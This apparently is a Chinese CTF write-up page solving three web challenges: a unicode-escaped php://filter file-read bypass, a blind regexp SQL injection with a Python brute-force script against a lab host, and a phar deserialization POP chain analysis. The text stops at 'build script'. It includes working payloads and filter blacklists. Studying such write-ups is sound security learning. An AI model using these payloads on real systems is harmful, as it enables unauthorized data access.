<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params">$str</span>) </span>&#123;</span><br><span class="line">  $banword = [</span><br><span class="line">    <span class="comment">// no path traversal</span></span><br><span class="line">    <span class="string">&#x27;\.\.&#x27;</span>,</span><br><span class="line">    <span class="comment">// no stream wrapper</span></span><br><span class="line">    <span class="string">&#x27;(php|file|glob|data|tp|zip|zlib|phar):&#x27;</span>,</span><br><span class="line">    <span class="comment">// no data exfiltration</span></span><br><span class="line">    <span class="string">&#x27;flag&#x27;</span></span><br><span class="line">  ];</span><br><span class="line">  $regexp = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, $banword) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (preg_match($regexp, $str)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$body = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);<span class="comment">//接受post数据</span></span><br><span class="line">$json = json_decode($body, <span class="literal">true</span>);<span class="comment">//json解密，故body需要为合法json字符串</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (is_valid($body) &amp;&amp; <span class="keyword">isset</span>($json) &amp;&amp; <span class="keyword">isset</span>($json[<span class="string">&#x27;page&#x27;</span>])) &#123;<span class="comment">//body中需含有page字段</span></span><br><span class="line">  $page = $json[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">  $content = file_get_contents($page);<span class="comment">//读取</span></span><br><span class="line">  <span class="keyword">if</span> (!$content || !is_valid($content)) &#123;<span class="comment">//过滤传参，一些伪协议，flag</span></span><br><span class="line">    $content = <span class="string">&quot;&lt;p&gt;not found&lt;/p&gt;\n&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  $content = <span class="string">&#x27;&lt;p&gt;invalid request&lt;/p&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// no data exfiltration!!!</span></span><br><span class="line">$content = preg_replace(<span class="string">&#x27;/HarekazeCTF\&#123;.+\&#125;/i&#x27;</span>, <span class="string">&#x27;HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;&#x27;</span>, $content);</span><br><span class="line"><span class="keyword">echo</span> json_encode([<span class="string">&#x27;content&#x27;</span> =&gt; $content]);</span><br></pre></td></tr></table></figure>

<p>is_valid过滤了很多协议还有遍历，随便起协议名再遍历读取是不能用了……</p>
<h3><span id="json转义">json转义</span></h3><p>json为提供一些特殊字符的传输，支持了Unicode，如：json_encode会将中文转换为unicode编码</p>
<p>所以此处使用Unicode即可绕过检查。</p>
<blockquote>
<p>{ “page” : “\u0070\u0068\u0070://filter/convert.base64-encode/resource=/\u0066\u006c\u0061\u0067”}</p>
</blockquote>
<p>flag{5c3db6bf-f5c9-4926-a809-ea7b4d23c37d}</p>
<p>获得flag……</p>
</div><div class="index-category-tag">  <hr></div></article></div><!--!--><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2021-05-04  <a class="commentCountImg" href="/2021/05/04/NCTF2019-SQLi/#comment-container"><span class="display-none-class">/2021/05/04/NCTF2019-SQLi/</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="1e1f6c9629f0efd1691695f64fd87a0d">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>2 分钟  <i class="fas fa-pencil-alt"> </i>0.3 k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/05/04/NCTF2019-SQLi/">NCTF2019-SQLi</a></h1><div class="content"><h3><span id="nctf2019sqli">[NCTF2019]SQLi</span></h3><p>进入题目是一个登录框注入</p>
<blockquote>
<p>sqlquery : select * from users where username=’’ and passwd=’’</p>
</blockquote>
<p>标识了查询语句，测试：</p>
<img src="/images/NCTF2019-SQLi/image-20210504174454423.png" alt="image-20210504174454423" style="zoom:80%;">

<p>过滤了很多……</p>
<p>robots.txt中有hint，提示了过滤规则与flag获取方式：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$black_list = <span class="string">&quot;/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\&#x27;|=| |in|&lt;|&gt;|-|\.|\(\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">If</span> $_POST[<span class="string">&#x27;passwd&#x27;</span>] === admin<span class="string">&#x27;s password,</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Then you will get the flag;</span></span><br></pre></td></tr></table></figure>

<p>引号被过滤，用转义：</p>
<blockquote>
<p>username=a&amp;passwd=/**/||1;%00</p>
</blockquote>
<p>结果永真，此时res出现了变化：</p>
<img src="/images/NCTF2019-SQLi/image-20210504174832423.png" alt="image-20210504174832423" style="zoom:80%;">

<p>实际上，这个页面并不存在……</p>
<p>我陷入了沉思……</p>
<h3><span id="regexp注入">regexp注入</span></h3><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8003">https://xz.aliyun.com/t/8003</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;\&amp;passwd&#x3D;&#x2F;**&#x2F;||username&#x2F;**&#x2F;regexp&#x2F;**&#x2F;&quot;^admin&quot;;%00</span><br></pre></td></tr></table></figure>

<p>此时，注入语句为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username&#x3D;&#39;xxx&#39;&#x2F;**&#x2F;||username&#x2F;**&#x2F;regexp&#x2F;**&#x2F;&quot;^admi&quot;;%00</span><br></pre></td></tr></table></figure>

<p>对username字段进行正则匹配，一个个移位匹配……（又是移位匹配……</p>
<p>写脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">url = <span class="string">&quot;http://9424a242-edab-424f-b620-ceca992f2e55.node3.buuoj.cn/&quot;</span></span><br><span class="line">string=<span class="string">&quot;1234567890qwertyuiopasdfghjklzxcvbnm_&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> string:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">&quot;\\&quot;</span>,</span><br><span class="line">            <span class="string">&quot;passwd&quot;</span>: <span class="string">&#x27;/**/||passwd/**/regexp/**/&quot;^&#123;&#125;&quot;;&#x27;</span>.<span class="built_in">format</span>(flag+s)+<span class="built_in">chr</span>(<span class="number">0</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># print(pay)</span></span><br><span class="line">        response = requests.post(url=url, data=data)</span><br><span class="line">        <span class="comment"># print(response.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;welcome.php&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="comment"># time.sleep(0.03)</span></span><br><span class="line">            flag += s</span><br><span class="line">            print(s)</span><br><span class="line">            print(flag)</span><br><span class="line">print(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src="/images/NCTF2019-SQLi/image-20210504182318273.png" alt="image-20210504182318273" style="zoom:80%;">

<p><img src="/images/NCTF2019-SQLi/image-20210504182429861.png" alt="image-20210504182429861"></p>
<p>得到flag……</p>
<p>官方wp：</p>
<p><a target="_blank" rel="noopener" href="http://yulige.top/?p=752#SQLi500pt_11solvers">http://yulige.top/?p=752#SQLi500pt_11solvers</a></p>
</div><div class="index-category-tag">  <hr></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2021-05-04  <a class="commentCountImg" href="/2021/05/04/SWPUCTF-2018-SimplePHP/#comment-container"><span class="display-none-class">/2021/05/04/SWPUCTF-2018-SimplePHP/</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="de32bed19a61fac890217ce31a9b1e49">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>6 分钟  <i class="fas fa-pencil-alt"> </i>0.8 k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/05/04/SWPUCTF-2018-SimplePHP/">SWPUCTF-2018-SimplePHP</a></h1><div class="content"><h3><span id="swpuctf-2018simplephp">[SWPUCTF 2018]SimplePHP</span></h3><p>进入题目，有一个file参数，尝试一下伪协议，无果……</p>
<p>结果直接读可以读出来</p>
<p>file.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);  </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;function.php&#x27;</span>; </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>; </span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/var/www/html/&#x27;</span>); </span><br><span class="line">$file = $_GET[<span class="string">&quot;file&quot;</span>] ? $_GET[<span class="string">&#x27;file&#x27;</span>] : <span class="string">&quot;&quot;</span>; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($file)) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line">$show = <span class="keyword">new</span> Show(); </span><br><span class="line"><span class="keyword">if</span>(file_exists($file)) &#123; </span><br><span class="line">    $show-&gt;source = $file; </span><br><span class="line">    $show-&gt;_show(); </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">empty</span>($file))&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;file doesn\&#x27;t exists.&#x27;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>function.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//show_source(__FILE__); </span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;base.php&quot;</span>; </span><br><span class="line">header(<span class="string">&quot;Content-type: text/html;charset=utf-8&quot;</span>); </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_do</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> $_FILES; </span><br><span class="line">    $filename = md5($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>].$_SERVER[<span class="string">&quot;REMOTE_ADDR&quot;</span>]).<span class="string">&quot;.jpg&quot;</span>; </span><br><span class="line">    <span class="comment">//mkdir(&quot;upload&quot;,0777); </span></span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="string">&quot;upload/&quot;</span> . $filename)) &#123; </span><br><span class="line">        unlink($filename); </span><br><span class="line">    &#125; </span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="string">&quot;upload/&quot;</span> . $filename); </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;&#x27;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> $_FILES; </span><br><span class="line">    <span class="keyword">if</span>(upload_file_check()) &#123; </span><br><span class="line">        upload_file_do(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_check</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> $_FILES; </span><br><span class="line">    $allowed_types = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;jpeg&quot;</span>,<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;png&quot;</span>); </span><br><span class="line">    $temp = explode(<span class="string">&quot;.&quot;</span>,$_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]); </span><br><span class="line">    $extension = end($temp); </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($extension)) &#123; </span><br><span class="line">        <span class="comment">//echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4/&gt;&quot;; </span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(in_array($extension,$allowed_types)) &#123; </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#x27;</span>; </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>class.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$name</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str = $name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test = <span class="keyword">$this</span>-&gt;str;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;   <span class="comment">//$this-&gt;source = phar://phar.jpg</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $content = <span class="keyword">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]-&gt;source;</span><br><span class="line">        <span class="keyword">return</span> $content;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params">$key,$value</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;$key = $value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;</span>,<span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            highlight_file(<span class="keyword">$this</span>-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker~&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $params;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$key</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get($key);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params">$key</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;params[$key])) &#123;</span><br><span class="line">            $value = <span class="keyword">$this</span>-&gt;params[$key];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $value = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;file_get($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span>(<span class="params">$value</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($value));</span><br><span class="line">        <span class="keyword">return</span> $text;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--flag is in f1ag.php--&gt;</span><br></pre></td></tr></table></figure>

<p>反序列化，但是没有反序列化利用点……</p>
<h3><span id="phar反序列化">phar反序列化</span></h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zzjdbk/p/13030571.html">https://www.cnblogs.com/zzjdbk/p/13030571.html</a></p>
<p>结合文件上传中的文件操作函数，可以利用phar中以反序列化方式储存的meta-data进行反序列化。在文件操作函数进行phar解析时，meta-data的数据也会一同解析。</p>
<p>开始找pop链：</p>
<p>先找魔法方法……__destruct()、__wakeup()、__toString()……</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$name</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str = $name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)//析构，脚本结束自动调用</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test = <span class="keyword">$this</span>-&gt;str;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;<span class="comment">//toString</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $content = <span class="keyword">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]-&gt;source;<span class="comment">//属性调用-》get</span></span><br><span class="line">        <span class="keyword">return</span> $content;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$key</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get($key);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params">$key</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;params[$key])) &#123;</span><br><span class="line">            $value = <span class="keyword">$this</span>-&gt;params[$key];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $value = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;file_get($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span>(<span class="params">$value</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($value));</span><br><span class="line">        <span class="keyword">return</span> $text;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后来到file_get_contents进行文件读取</p>
<p>构建脚本：</p>
